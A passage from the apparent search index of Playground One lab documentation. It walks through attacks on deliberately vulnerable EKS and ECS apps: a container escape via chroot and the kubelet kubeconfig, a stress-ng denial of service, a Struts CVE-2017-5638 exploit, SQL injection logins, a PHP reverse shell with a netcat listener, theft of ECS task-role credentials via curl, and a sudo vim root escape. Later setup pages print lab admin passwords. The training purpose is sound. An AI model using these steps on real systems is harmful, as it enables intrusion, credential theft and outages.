\ud83c\udf89"},{"location":"scenarios/eks/escape/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.  <pre><code>capsh --print\n</code></pre> <pre><code>mount\n</code></pre>  Now you can explore the mounted file system by navigating to the `/host-system` path  <pre><code>ls /host-system/\n</code></pre>  You can gain access to the host system privileges using `chroot`.  <pre><code>chroot /host-system bash\n</code></pre>  As you can see, now you can access all the host system resources like docker containers, configurations, etc.  Trying to use the docker client fails.  <pre><code>docker ps\n</code></pre> <pre><code>bash: docker: command not found\n</code></pre>  This does not work, since we're on a Kubernetes optimized node OS with no docker provided.  <pre><code>uname -a\n</code></pre> <pre><code>Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Jul 12 18:40:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre>  The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.  <pre><code>cat /var/lib/kubelet/kubeconfig\n</code></pre> <pre><code>apiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    certificate-authority: /etc/kubernetes/pki/ca.crt\n    server: https://BD215DBE2E4127977439D904B2AD3307.gr7.eu-central-1.eks.amazonaws.com\n  name: kubernetes\ncontexts:\n- context:\n    cluster: kubernetes\n    user: kubelet\n  name: kubelet\ncurrent-context: kubelet\nusers:\n- name: kubelet\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1beta1\n      command: /usr/bin/aws-iam-authenticator\n      args:\n        - \"token\"\n        - \"-i\"\n        - \"playground-one-eks\"\n        - --region\n        - \"eu-central-1\"\n</code></pre>  Sadly, there is no `kubectl` as well.  <pre><code>kubectl\n</code></pre> <pre><code>bash: kubectl: command not found\n</code></pre>  Trying to use the package manager `yum` will not solve the problem. But navigating to https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux will help:  <pre><code>cd\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x kubectl\n</code></pre>  Try to get the available nodes of our cluster:  <pre><code>./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes \n</code></pre> <pre><code>NAME                                            STATUS   ROLES    AGE   VERSION\nip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad\nip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad\n</code></pre>  Can you do more?  <pre><code>./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A\n</code></pre> <pre><code>NAMESPACE           NAME                                               READY   STATUS    RESTARTS   AGE\ngoat                system-monitor-6dfbdbb7d-w6mdv                     1/1     Running   0          53m\nkube-system         aws-load-balancer-controller-577dcc6f77-sqtfr      1/1     Running   0          92m\nkube-system         aws-node-8wl6v                                     1/1     Running   0          92m\nkube-system         aws-node-ksdjv                                     1/1     Running   0          92m\nkube-system         cluster-autoscaler-6696cf9bff-2s52q                1/1     Running   0          92m\nkube-system         coredns-6bcddfff7-hrwwl                            1/1     Running   0          92m\nkube-system         coredns-6bcddfff7-kp266                            1/1     Running   0          92m\nkube-system         ebs-csi-controller-7dffd5b9fd-2w7r8                6/6     Running   0          92m\nkube-system         ebs-csi-controller-7dffd5b9fd-fdhfc                6/6     Running   0          92m\nkube-system         ebs-csi-node-k77sx                                 3/3     Running   0          92m\nkube-system         ebs-csi-node-vj6c7                                 3/3     Running   0          92m\nkube-system         kube-proxy-62dls                                   1/1     Running   0          92m\nkube-system         kube-proxy-mshz7                                   1/1     Running   0          92m\ntrendmicro-system   trendmicro-admission-controller-74d8d7f866-dv87r   1/1     Running   0          53m\ntrendmicro-system   trendmicro-oversight-controller-557df87c9-6c4dx    2/2     Running   0          69m\ntrendmicro-system   trendmicro-scan-manager-6ddb6f69b8-r85dk           1/1     Running   0          53m\ntrendmicro-system   trendmicro-scout-gkl4k                             2/2     Running   0          69m\ntrendmicro-system   trendmicro-scout-tz68w                             2/2     Running   0          69m\ntrendmicro-system   trendmicro-usage-controller-6944c5b55b-m8hgh       2/2     Running   0          53m\ntrendmicro-system   trendmicro-workload-operator-6cf5c98c6f-xq8bb      1/1     Running   0          69m\ntrivy-system        trivy-operator-57c774d7c4-hmnlk                    1/1     Running   0          53m\nvictims             java-goof-5878dd4dd-9lnst                          1/1     Running   0          53m\nvictims             web-app-854bdf944f-ddqcs                           1/1     Running   0          53m\n</code></pre> <pre><code>./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes \n</code></pre> <pre><code>NAME                                            STATUS   ROLES    AGE   VERSION\nip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad\nip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad\n</code></pre>  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/eks/hunger-check/","title":"Scenario: Hunger Check","text":""},{"location":"scenarios/eks/hunger-check/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Playground One Scenarios<ul> <li>Running app: Hunger Check</li> </ul> </li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre> <p>We will use the Kubernetes Metrics Server which is an aggregator of resource usage data in our cluster. The Metrics Server isn't deployed by default in Amazon EKS clusters. To deploy it run</p> <pre><code>kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml\n</code></pre>"},{"location":"scenarios/eks/hunger-check/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/eks/hunger-check/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/hunger-check/#overview","title":"Overview","text":"<p>Availability is one of the triads in CIA. One of the core problems solved by Kubernetes is the management of the resources like autoscaling, rollouts, etc. In this scenario, we will see how attackers can leverage and gain access to more resources or cause an impact on the availability of the resources by performing the DoS (Denial of Service) if there were no resource management configurations implemented on the cluster resources like memory and CPU requests and limits.</p> <p>By the end of the scenario, we will understand and learn the following</p> <ul> <li>Learn to perform the DoS on computing and memory resources using stress-ng</li> <li>Understand the Kubernetes resources management for pods and containers</li> <li>Explore the Kubernetes resource monitoring using the metrics and information</li> </ul>"},{"location":"scenarios/eks/hunger-check/#the-story","title":"The story","text":"<p>There is no specification of resources in the Kubernetes manifests and no applied limit ranges for the containers. As an attacker, we can consume all the resources where the pod/deployment running and starve other resources and cause a DoS for the environment.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_hunger_check&gt;</code></p>"},{"location":"scenarios/eks/hunger-check/#goals","title":"Goals","text":"<p>Access more resources than intended for this pod/container by consuming 2GB of memory to successfully complete the scenario.</p> <p>Tip: If you are able to obtain containers running in the host system then you have completed this scenario. But definitely, you can advance beyond this exploitation as well by performing post-exploitation, e.g. spinning up an additional container.</p>"},{"location":"scenarios/eks/hunger-check/#hints","title":"Hints","text":"Click here  \u2728 How can I DoS resources?  You can leverage the popular command line utility like stress-ng \ud83d\ude4c"},{"location":"scenarios/eks/hunger-check/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  This deployment pod has not set any resource limits in the Kubernetes manifests. So we can easily perform a bunch of operations that can consume more resources.  We can use simple utilities like stress-ng to perform stress testing like accessing more resources. The below command is to access more resources than specified.  <pre><code>root@hunger-check-655dfcd8b9-bcfgq:/# stress-ng --vm 2 --vm-bytes 2G --timeout 30s\n</code></pre> <pre><code>stress-ng: info:  [41] dispatching hogs: 2 vm\nstress-ng: info:  [41] successful run completed in 30.09s\nroot@hunger-check-655dfcd8b9-bcfgq:/# \n</code></pre>  You can see the difference between the normal resources consumption vs while running stress-ng where it consumes a lot of resources than it intended to consume. Run the following command in your local/Cloud9 shell:  <pre><code>watch kubectl --namespace goat top pod $(kubectl -n goat get pods --selector=app=hunger-check -o jsonpath='{.items[0].metadata.name}')\n</code></pre>  ***DANGER***  This attack may not work in some cases like autoscaling, resource restrictions, etc. Also, it may cause more damage when autoscaling is enabled and more resources are created. This could lead to more expensive bills by the cloud provider or impacting the availability of the resources and services.  Hooray \ud83e\udd73, now we can see that it can consume more resources than intended which might affect the resource availability and also increase billing.  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/eks/runtime-violations/","title":"Scenario: Vision One Container Security Generate Runtime Violations","text":""},{"location":"scenarios/eks/runtime-violations/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/eks/runtime-violations/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/runtime-violations/#overview","title":"Overview","text":"<p>Automated malicious actions are executed every full hour on your cluster which lead to detections in Container Security.</p>"},{"location":"scenarios/eks/runtime-violations/#the-story","title":"The story","text":"<p>There is no real story here :-)</p>"},{"location":"scenarios/eks/runtime-violations/#goals","title":"Goals","text":"<p>Review the detections in Vision One. Check Observed Attack Techniques and Workbenches.</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/","title":"Scenario: Runtime Vulnerability Scanning","text":"<p>DRAFT</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#overview","title":"Overview","text":"<p>This scenario showcases the vulnerability detection functionalities of Vision One Container Security at runtime. The deployments of the scenarios configuration are all based on container images with plenty of different vulnerabilities.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Reviewing vulnerability findings and searching for a specific vulnerability</li> <li>Proof the finding by exploitation</li> </ul>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#the-story","title":"The story","text":"<p>Every now and then new critical vulnerabilities are disclosed. A famous one with huge impact was the  vulnerability CVE-2017-5638. </p> <p>On March 6th 2017, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This vulnerability allows a remote attacker to inject operating system commands into a web application through the \u201cContent-Type\u201d header. Written in Java, Apache Struts 2 is the popular open source web application framework. This is yet another incident that adds up to a long list of vulnerabilities in this framework.</p> <p>You want to search and validate for this specific vulnerability in your production environment.</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#goals","title":"Goals","text":"<p>The goal of this scenario is to identify the vulnerable deployment and proof that it is vulnerable.</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#hints","title":"Hints","text":"Click here  \u2728 Didn't find the vulnerable deployment?  Head over to Container Security --&gt; Runtime vulnerability and search for CVE-2017-5638. \ud83d\ude4c"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  Head over to Attack Surface Risk Managemet and search for the vulnerability CVE-2017-5638  Identify the vulnerable deployment/container  Find out the namespace and metadata.  You'll see that the deployment is running within the `victims` namespace and owns the label `app=java-goof`.  Checking the services in the namespace `victims`   <pre><code>kubectl -n victims get services\n</code></pre>  tells us  <pre><code>NAME                TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE\njava-goof-service   NodePort   172.20.132.99    &lt;none&gt;        8080:30119/TCP   26m\nweb-app-service     NodePort   172.20.121.120   &lt;none&gt;        80:32194/TCP     26m\n</code></pre>  That `java-goof` is reachable on port 8080.  Let's try to verify the vulnerability using the `attacker-cve-2017-5638` pod running in the namespace `attackers`. In your shell run  <pre><code>namespace=\"victims\"\n\nkubectl exec -n attackers \\\n  $(kubectl -n attackers get pods --selector=app=attacker-cve-2017-5638 -o jsonpath='{.items[0].metadata.name}') -- \\\n  python3 exploit.py http://java-goof-service.${namespace}:8080 'cat /etc/passwd'\n</code></pre> <pre><code>[*] CVE: 2017-5638 - Apache Struts2 S2-045\n[*] cmd: cat /etc/passwd\n\nb'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n'\n</code></pre>  You proofed that the application server of your little todolist application is vulnerable to CVE-2017-5638.  You may recognize the url `http://java-goof-service.${namespace}:8080` used in the `kubectl` command. Since we're attacking from a pod running on the cluster we can reference the java-goof-service by it's DNS name managed by CoreDNS. The schema for this is `service.namespace`.  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/eks/runtime-vulnerability-fargate/","title":"Scenario: Runtime Vulnerability Scanning on Fargate","text":"<p>DRAFT</p>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS Fargate Cluster </li> <li>Vision One Container Security</li> <li>Playground One Scenarios<ul> <li>Running app: Nginx</li> </ul> </li> </ul> <p>Ensure to have the EKS Fargate Cluster up and running:</p> <pre><code>pgo --apply eks-fg\npgo --apply scenarios-fg\n</code></pre>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#overview","title":"Overview","text":"<p>This scenario showcases the vulnerability detection functionalities of Vision One Container Security at runtime for EKS with Fargate profiles.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Reviewing vulnerability findings and searching for a specific vulnerability</li> </ul>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#the-story","title":"The story","text":"<p>Here we're checking for the CVE-2021-3711 in OpenSSL with a criticality of 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).</p> <p>You want to search this specific vulnerability in your production environment.</p>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#goals","title":"Goals","text":"<p>The goal of this scenario is to identify the vulnerable deployment and proof that it is vulnerable.</p>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#hints","title":"Hints","text":"Click here  \u2728 Didn't find the vulnerable deployment?  Head over to Container Security --&gt; Runtime vulnerability and search for CVE-2017-5638. \ud83d\ude4c"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  Head over to Attack Surface Risk Managemet and search for the vulnerability CVE-2021-3711  Identify the vulnerable deployment/container.  Find out the node(s) running the pod(s).  <pre><code>kubectl get pods -A -o wide\n</code></pre>  You'll see that the deployment is running within the `default` namespace. The name(s) of the worker nodes start with `fargate-ip-...` which indicate that these nodes are AWS managed Fargate nodes.  Checking the services  <pre><code>kubectl get services\n</code></pre>  tells us  <pre><code>NAME            TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE\nnginx-service   NodePort   172.20.48.60   &lt;none&gt;        80:32443/TCP   26m\n</code></pre>  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/goat/goat-goatherd/","title":"Scenario: Goatherd","text":""},{"location":"scenarios/goat/goat-goatherd/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One Goat</li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply goat\n</code></pre> <p>Ensure to have Runtime Security enabled on the Vision One Console for this cluster.</p>"},{"location":"scenarios/goat/goat-goatherd/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/goat/goat-goatherd/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o goat\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>target_2_url = \"pgo-alb-qqrpqokp-1741705218.eu-central-1.elb.amazonaws.com:80/login.php\"\n</code></pre>"},{"location":"scenarios/goat/goat-goatherd/#exploit","title":"Exploit","text":"<p>SQL Injection</p> <ul> <li> <p>Now, we can find Email as an injection point to perform the SQLi.</p> <p></p> <pre><code>' or '1'='1'#\n</code></pre> </li> <li> <p>As we can see, there is a front-end check for the Email field. To get around that, we need to change the input field's type from email to text and then perform the injection. This should work if there is no backend email verification.</p> <p></p> <p></p> </li> <li> <p>Voila! we are into the application!</p> <p></p> </li> </ul> <p>SQL Injection with different user</p> <ul> <li> <p>We can assume that the users table has a column named 'id'. An admin likely has the lowest user id. So try</p> <pre><code>'or '1'='1' ORDER BY id DESC#\n</code></pre> </li> <li> <p>This will put the user with the smallest id to the end of the select query and will therefore be used for authentication.</p> </li> <li> <p>When dumping all the table rows the SQL LIMIT clause can be helpful to control the number of rows returned by SQL. Let's use the payload below: </p> <pre><code>'or '1'='1' LIMIT 3 #\n</code></pre> </li> <li> <p>In this case we are a user with a manager role capable to upload payslips.</p> </li> </ul> <p>Upload PHP reverse shell</p> <ul> <li> <p>Create an EC2 instance with a public IP, connect to it and start netcat with <code>nc -nlvp 45678</code></p> </li> <li> <p>Head over to Payslips and upload the php file for the user Mark. Be sure to adapt the IP in the beginning of the php file so that it points to your server from above.</p> </li> <li> <p>Logout and relogin with SQLi using</p> <pre><code>'or '1'='1'#\n</code></pre> </li> <li> <p>You are now Mark and are checking for new payslips. Choose the one with the highest ID. This should trigger the PHP reverse shell.</p> </li> <li> <p>Head over to your EC2 instance and interact with the shell running in your ECS container task.</p> </li> </ul> <p>Recon</p> <ul> <li> <p>When running <code>id</code> we see, that we're not root but <code>www-data</code>, sadly.</p> </li> <li> <p>Let's start by printing out the Environment Variables</p> <p>```console printenv ````</p> </li> <li> <p>We can ascertain a lot of information from the environment variables. From the <code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>, it is evident that we have a shell inside a container. From the <code>AWS_EXECUTION_ENV</code>, it is evident we are in an ECS container that is running on an EC2 instance host. Also from the <code>RDS_ENDPOINT</code> we can assume the application is using the RDS service.</p> <p></p> </li> <li> <p>Now, run the below command to get the ECS container's metadata.</p> <pre><code>curl http://172.17.0.1:51678/v1/metadata\n</code></pre> <p></p> </li> <li> <p>On examining the output, we can find that the target application is running on a Container Instance. From the <code>ContainerInstanceArn</code> we have found the aws accounts' information where the HR application is deployed.</p> </li> <li> <p>Containers in AWS Elastic Container Service (ECS) are run using <code>tasks</code> and tasks have a role assigned to them that is passed on to the ECS Containers. Since we've already established that the application is running on an ECS container, let's try to get it's AWS Role Credentials by running the below command.</p> <pre><code>curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\n</code></pre> </li> <li> <p>Voila! We obtained Container Credentials.</p> <p></p> </li> <li> <p>When running <code>id</code> we see, that we're not root, sadly.</p> </li> </ul> <p>Escalating Privilege to root user</p> <ul> <li> <p>We can try to switch to root:</p> <pre><code>sudo su\n</code></pre> </li> <li> <p>But we can't do that</p> </li> <li> <p>We can try to list commands that we are allowed to run as superuser on the host.</p> <pre><code>sudo -l\n</code></pre> </li> <li> <p>The current user can run vim on the /var/www/html/documents directory as root without using a password. This can allow us to escalate our privileges as vim in itself does feature an internal command line executor.</p> <pre><code>(root) NOPASSWD: /usr/bin/vim /var/www/html/documents\n</code></pre> </li> <li> <p>Now we can try to get root access by running vim on the <code>/var/www/html/documents</code> directory with root privileges using the following command:</p> <pre><code>sudo /usr/bin/vim /var/www/html/documents\n</code></pre> </li> <li> <p>Here we can try to spawn a shell through vims' internal command line executor by using the command after pressing the  key: <pre><code>:! /bin/sh\n</code></pre> <li> <p>We haven't come across an error, and have spawned a new shell. Run the below-mentioned commands to check if we have escalated our privileges.</p> <pre><code>whoami\nid\n</code></pre> </li> <p>More to come</p>"},{"location":"scenarios/vision-one/v1-aws-service-gateway-automatically/","title":"Scenario: Deploy Vision One Service Gateway on AWS Automatically","text":"<p>DRAFT</p>"},{"location":"scenarios/vision-one/v1-aws-service-gateway-automatically/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network</li> <li>Activated Marketplace AMI for Trend Service Gateway BYOL</li> </ul> <p>You need to have activated the Trend Service Gateway BYOL AMI in Marketplace once. To do this, on the AWS Console choose the service EC2 and navigate to <code>Images --&gt; AMI Catalog</code>. Select the tab <code>AWS Marketplace AMIs</code> and seach for <code>Trend Micro Service Gateway</code>.</p> <p></p> <p>There should only be one AMI shown for your current region. Click on <code>[Select]</code> and <code>[Subscribe on instance launch]</code>. </p> <p></p> <p>Now, check your Playground One configuration.</p> <p>Verify, that you have <code>AWS SG - create Service Gateway</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nAWS SG - create Service Gateway [true]:\n...\n</code></pre> <pre><code># With SG enabled\npgo --apply network\n</code></pre> <p>The Service Gateway gets a dedicated AWS Security Group assigned which allows SSH from your configured access IP(s) only. All other ports are only accessible from within the public and private subnets.</p>"},{"location":"scenarios/vision-one/v1-aws-service-gateway-automatically/#get-the-vision-one-api-key","title":"Get the Vision One API Key","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> and click on <code>[Download Virtual Appliance]</code>.</p> <p></p> <p>You don't need to download the virtual appliance since we're going to use a AWS Marketplace AMI. Simply copy the Registration Token shown in the bottom right and save it to a secure place.</p> <p></p>"},{"location":"scenarios/vision-one/v1-aws-service-gateway-automatically/#activate-the-service-gateway","title":"Activate the Service Gateway","text":"<p>Back to your console/shell run the following command (adapt the parameters to your environment):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nsg_va_ssh = \"ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\"\n...\nmad_admin_password = XrJ*5VPDZGmhhL70\n</code></pre> <p>The interesting value here is <code>sg_va_ssh</code>. Run the given command to connect to the Service Gateway.</p> <pre><code>ssh -i /home/markus/projects/opensource/playground/playground-one/pgo-key-pair-oaxuizlr.pem -o StrictHostKeyChecking=no admin@18.194.239.58\n</code></pre> <p></p> <p>TODO: Screenshot needs update</p> <pre><code>enable\n\nregister &lt;your API Token from the first step&gt;\n</code></pre> <p>It can take some time for the Service Gateway to show up in the console.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/vision-one/v1-aws-service-gateway-manually/","title":"Scenario: Deploy Vision One Service Gateway on AWS Manually","text":"<p>DRAFT</p>"},{"location":"scenarios/vision-one/v1-aws-service-gateway-manually/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network</li> </ul> <pre><code>pgo --apply network\n</code></pre>"},{"location":"scenarios/vision-one/v1-aws-service-gateway-manually/#get-the-vision-one-api-key","title":"Get the Vision One API Key","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> and click on <code>[Download Virtual Appliance]</code>.</p> <p></p> <p>You don't need to download the virtual appliance since we're going to use a AWS Marketplace AMI. Simply copy the Registration Token shown in the bottom right and save it to a secure place.</p> <p></p>"},{"location":"scenarios/vision-one/v1-aws-service-gateway-manually/#launch-instance-on-aws","title":"Launch Instance on AWS","text":"<p>Now, on the AWS Console choose the service EC2 and navigate to <code>Images --&gt; AMI Catalog</code>. Select the tab <code>AWS Marketplace AMIs</code> and seach for <code>Trend Micro Service Gateway</code>.</p> <p></p> <p>There should only be one AMI shown for your current region. Click on <code>[Select]</code> and <code>[Subscribe now]</code>. </p> <p></p> <p>This will bring you to <code>Launch an instance</code>.</p> <p></p> <p>Give it a name, something like <code>Vision One Service Gateway</code> could make sense.</p> <p></p> <p></p> <ul> <li>Instance type: <code>c5.2xlarge</code></li> <li>Key pair name: your Playground One key pair</li> </ul> <p></p> <ul> <li>VPC: your Playground One VPC</li> <li>Subnet: one of the public Playground One subnets</li> </ul> <p></p> <p>Leave the security group settings for now as default.</p> <p></p> <p>Same to the storage.</p> <p>Check the summary and click on <code>[Launch instance]</code>.</p> <p>When the instance is up and running, get the public IP of the instance and proceed with the next step.</p>"},{"location":"scenarios/vision-one/v1-aws-service-gateway-manually/#activate-the-service-gateway","title":"Activate the Service Gateway","text":"<p>Back to your console/shell run the following command (adapt the parameters to your environment):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nmad_id = \"d-99677cba24\"\nmad_ips = toset([\n  \"10.0.0.37\",\n  \"10.0.1.229\",\n])\n...\nkey_name = \"pgo-key-pair-oaxuizlr\"\nmad_admin_password = &lt;sensitive&gt;\n...\nmad_admin_password = XrJ*5VPDZGmhhL70\n</code></pre> <p>The interesting value here is <code>key_name</code>.</p> <pre><code>key_name=&lt;key_name&gt;\npublic_ip=&lt;public IP of your Security Gateway instance&gt;\n\nssh -i ${ONEPATH}/${key_name}.pem admin@${public_ip}\n</code></pre> <p></p> <p>TODO: Screenshot needs update</p> <pre><code>enable\n\nregister &lt;your API Token from the first step&gt;\n</code></pre> <p>It can take some time for the Service Gateway to show up in the console.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/vision-one/v1-integrate-active-directory/","title":"Scenario: Integrate an Active Directory with Vision One via Service Gateway on AWS","text":"<p>DRAFT</p>"},{"location":"scenarios/vision-one/v1-integrate-active-directory/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One Network with PGO Active Directory and/or Managed Active Directory enabled</li> </ul> <p>Verify, that you have <code>AWS AD - create PGO Active Directory</code> and/or <code>AWS MAD - create Managed Active Directory</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nAWS MAD - create Managed Active Directory [true]:\n# and/or\nAWS AD - create PGO Active Directory [true]:\n...\n</code></pre> <pre><code>pgo --apply network\n</code></pre>"},{"location":"scenarios/vision-one/v1-integrate-active-directory/#connect-an-active-directory","title":"Connect an Active Directory","text":"<p>In Vision One head over to <code>Workflow and Automation -&gt; Service Gateway Management</code> again. There should now be a Service Gateway listed. Select it, click on <code>Manage Services</code> just in the center, and download the <code>On-premise directory connection</code> to the gateway.</p> <p></p> <p></p> <p>Since the Playground One is able to create two different Active Directories depending on what you have enabled in your configuration continue if the following chapters.</p>"},{"location":"scenarios/vision-one/v1-integrate-active-directory/#connect-the-pgo-active-directory","title":"Connect the PGO Active Directory","text":"<p>From within your console/shell run the following command (or find the output from the previous step):</p> <pre><code>pgo --output network\n</code></pre> <pre><code>...\nad_ca_ip = \"54.93.162.135\"\nad_dc_ip = \"3.71.102.69\"\nad_dc_pip = \"10.0.4.57\"\n...\nkey_name = \"pgo-key-pair-oaxuizlr\"\n...\nad_admin_password = TrendMicro.1\n</code></pre> <p>The interesting values are now <code>ad_dc_pip</code> and the <code>ad_admin_password</code>.</p> <p>Lastly, in the Connection Settings choose the following parameters:</p> <ul> <li>Server Type: Microsoft Active Directory</li> <li>Server address: One of the private IPs out of <code>ad_dc_pip</code></li> <li>Encryption: <code>SSL</code></li> <li>Port: <code>636</code></li> <li>Base Distinguished Name: <code>Specific</code>, value: <code>DC=&lt;your environment name&gt;, DS=local</code></li> <li>Permission scope: <code>Read &amp; write</code></li> <li>User Name: <code>Administrator@&lt;your environment name&gt;.local</code></li> <li>Password: <code>ad_admin_password</code></li> </ul> <p>Example with environment name <code>pgo-id</code>:</p> <p></p> <p>This should connect the Active Directory to Vision One via the Service 